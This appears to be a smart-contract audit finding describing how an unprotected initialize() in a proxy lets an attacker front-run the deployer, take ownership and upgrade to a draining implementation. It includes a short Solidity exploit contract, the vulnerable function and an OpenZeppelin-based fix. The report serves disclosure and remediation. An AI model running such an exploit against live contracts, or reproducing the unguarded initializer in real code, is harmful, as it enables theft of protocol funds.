# H-03: Access control missing on initialize() allows ownership hijacking

## Severity: High

## Lines of code
https://github.com/notional-finance/contracts-v3/blob/main/contracts/proxy/ProxyAdmin.sol#L45-L62

## Vulnerability details

### Impact

The `initialize()` function in the upgradeable proxy implementation can be called by anyone after deployment if the deployer forgets to call it in the same transaction. An attacker can call `initialize()` to set themselves as the owner and then upgrade the proxy to a malicious implementation, stealing all protocol funds.

### Proof of Concept

1. Protocol deploys the proxy contract in tx A.
2. Protocol intends to call `initialize()` in tx B.
3. Attacker front-runs tx B by calling `initialize(attackerAddress)`.
4. Attacker now owns the proxy and calls `upgradeToAndCall()` with a draining implementation.

```solidity
// Attack script
contract Exploit {
    function attack(IProxy proxy) external {
        // Call unprotected initialize
        proxy.initialize(address(this));
        
        // Deploy draining implementation
        DrainImpl drain = new DrainImpl();
        
        // Upgrade proxy to draining implementation
        proxy.upgradeToAndCall(
            address(drain),
            abi.encodeCall(DrainImpl.drain, (address(this)))
        );
    }
}
```

### Root cause

The `initialize()` function lacks the `initializer` modifier from OpenZeppelin's `Initializable`:

```solidity
// ProxyAdmin.sol line 45 — MISSING initializer MODIFIER
function initialize(address _owner) external {
    // Missing: require(!initialized, "already initialized");
    // Missing: initialized = true;
    owner = _owner;
    emit OwnershipTransferred(address(0), _owner);
}
```

### Recommended Mitigation

Use OpenZeppelin's `Initializable` contract:

```solidity
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";

contract ProxyAdmin is Initializable {
    function initialize(address _owner) external initializer {
        owner = _owner;
        emit OwnershipTransferred(address(0), _owner);
    }
}
```

Alternatively, call `initialize()` atomically in the constructor or deployment script using `CREATE2` with a bundled init call.

## Tools used
Manual review, Slither

## Assessed type
Access Control
